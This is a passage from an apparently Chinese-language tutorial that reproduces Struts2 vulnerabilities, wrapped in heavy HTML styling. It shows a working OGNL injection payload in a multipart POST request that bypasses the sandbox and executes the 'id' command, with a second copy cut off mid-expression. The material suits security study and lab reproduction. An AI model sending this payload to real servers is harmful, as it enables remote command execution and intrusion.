1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">%25{10*10}</code>发现运算成功，证明漏洞存在</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.96875" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/71_g8jBXiaV1pdZe5IUicQEbOmkAbnvSg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wZice6PkZia1S9kXELg8Evhm96Wjag8jBXiaV1pdZe5IUicQEbOmkAbnvSg/640?wx_fmt=png'" data-type="png" data-w="672" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">bp在<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">index.action</code>页面抓包</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.8048780487804879" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/72_k8x8ia9KTT1paU1TTccOXeBgFLm4Iw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wzPSAeLMxdzEnff9ZWHNPPzkDAk8x8ia9KTT1paU1TTccOXeBgFLm4Iw/640?wx_fmt=png'" data-type="png" data-w="984" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">修改<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">Content-Type</code>如下并添加数据，这里如果直接使用GET方法是得不到回显的</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Content</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Type</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> multipart</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">form</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">data</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> boundary</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=----</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">WebKitFormBoundaryl7d1B1aGsV2wcZwF</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">------</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">WebKitFormBoundaryl7d1B1aGsV2wcZwF</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Content</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Disposition</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> form</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">data</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> name</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"id"</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%{(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">instancemanager</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">application</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"org.apache.tomcat.InstanceManager"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">]).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">stack</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">attr</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"com.opensymphony.xwork2.util.ValueStack.ValueStack"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">]).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">bean</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">instancemanager</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">newInstance</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"org.apache.commons.collections.BeanMap"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">bean</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">setBean</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">stack</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">context</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">bean</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">get</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"context"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">bean</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">setBean</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">context</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">macc</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">bean</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">get</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"memberAccess"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">bean</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">setBean</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">macc</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">emptyset</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">instancemanager</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">newInstance</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"java.util.HashSet"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">bean</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">put</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"excludedClasses"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">emptyset</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">bean</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">put</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"excludedPackageNames"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">emptyset</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">arglist</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">instancemanager</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">newInstance</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"java.util.ArrayList"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">arglist</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">add</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"id"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">execute</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">instancemanager</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">newInstance</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"freemarker.template.utility.Execute"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">execute</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">exec</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">arglist</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">))}</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">------</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">--</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.8048780487804879" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/73_ejba4jbG4iaWZd0QolbRb3OKaoXQrg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5w30TxNIicxHyxu12kYb1B2m8H50ejba4jbG4iaWZd0QolbRb3OKaoXQrg/640?wx_fmt=png'" data-type="png" data-w="984" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">改为POST方法即可得到id</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.8048780487804879" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/74_tyYfH0iaQianiah3rib9ktwSuhh7Xg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wn7vtoPFnlicVDG34cibndGXsBohTibTtyYfH0iaQianiah3rib9ktwSuhh7Xg/640?wx_fmt=png'" data-type="png" data-w="984" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">配合dnslog食用同理</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">------</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">WebKitFormBoundaryl7d1B1aGsV2wcZwF</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Content</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Disposition</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> form</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">data</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> name</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"id"</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%{(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">instancemanager</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">application</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"org.apache.tomcat.InstanceManager"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">]).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">stack</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">attr</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"com.opensymphony.xwork2.util.ValueStack.ValueStack"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">]).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">bean</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">instancemanager</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">newInstance</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"org.apache.commons.collections.BeanMap"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">bean</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">setBean</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">stack</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">context</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">bean</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">get</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"context"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">bean</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">setBean</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">context</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">macc</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">bean</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">get</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"memberAccess"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">bean</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">setBean</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">macc</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">emptyset</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">instancemanager</span><span 